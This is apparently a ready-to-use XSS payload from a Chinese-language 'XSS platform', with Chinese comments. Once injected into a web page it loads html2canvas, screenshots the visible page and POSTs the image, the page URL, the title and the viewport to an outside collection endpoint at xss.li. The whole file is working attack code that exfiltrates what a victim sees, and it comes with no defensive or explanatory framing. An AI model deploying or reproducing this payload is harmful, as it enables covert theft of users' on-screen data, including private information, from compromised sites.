// 超级截屏Payload - 黑客仓库XSS平台
// 使用html2canvas截取当前页面完整截图

(function() {
    'use strict';
    
    var config = {
        serverUrl: 'https://xss.li/api/collect.php',
        quality: 0.7
    };
    
    console.log('📸 黑客仓库XSS - 截屏模块启动');
    
    // 动态加载html2canvas库
    function loadHtml2Canvas() {
        return new Promise((resolve, reject) => {
            if (window.html2canvas) {
                resolve(window.html2canvas);
                return;
            }
            
            var script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
            script.onload = function() {
                resolve(window.html2canvas);
            };
            script.onerror = reject;
            document.head.appendChild(script);
        });
    }
    
    // 执行截屏
    async function captureScreen() {
        try {
            const html2canvas = await loadHtml2Canvas();
            console.log('📸 html2canvas加载成功，开始截屏...');
            
            const canvas = await html2canvas(document.body, {
                allowTaint: true,
                useCORS: true,
                logging: false,
                scale: 1
            });
            
            const screenshot = canvas.toDataURL('image/jpeg', config.quality);
            console.log('📸 截屏成功，图片大小:', (screenshot.length / 1024).toFixed(2), 'KB');
            
            // 发送到服务器
            const response = await fetch(config.serverUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'screenshot',
                    image: screenshot,
                    url: window.location.href,
                    title: document.title,
                    timestamp: new Date().toISOString(),
                    viewport: {
                        width: window.innerWidth,
                        height: window.innerHeight
                    }
                })
            });
            
            if (response.ok) {
                console.log('✅ 截图上传成功');
            } else {
                console.log('❌ 截图上传失败');
            }
            
        } catch (error) {
            console.error('截屏失败:', error);
        }
    }
    
    captureScreen();
    
})();
